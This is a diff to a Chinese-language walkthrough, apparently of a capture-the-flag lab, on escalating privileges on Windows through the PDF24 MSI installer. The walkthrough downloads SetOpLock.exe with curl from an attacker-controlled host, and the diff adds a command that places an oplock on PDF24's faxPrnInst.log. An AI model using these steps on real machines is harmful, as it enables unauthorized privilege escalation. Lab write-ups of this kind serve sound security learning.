@@ -421,7 +421,10 @@ drwxr-xr-x 6 syareya55 syareya55 4.0K Dec 15 02:22 assets
 ```
 C:\Users\gale.dekarios>curl http://10.10.14.190:5001/SetOpLock.exe -o SetOpLock.exe
 ```
-#### 在本文的开发步骤之后，我们执行以下命令在PDF24使用的faxprininst .log文件。
+#### 在本文的开发步骤之后，我们执行以下命令在PDF24使用的faxprininst.log文件。
+```
+C:\Users\gale.dekarios> .\SetOpLock.exe “C:\Program Files\PDF24\faxPrnInst.log” -r
+```
 ![图片](image/121505.png)
 #### 这个窗口会一直停留
 #### 安装好Oplock后，我们打开一个新的命令shell，并使用脆弱的PDF24 MSI安装程序。
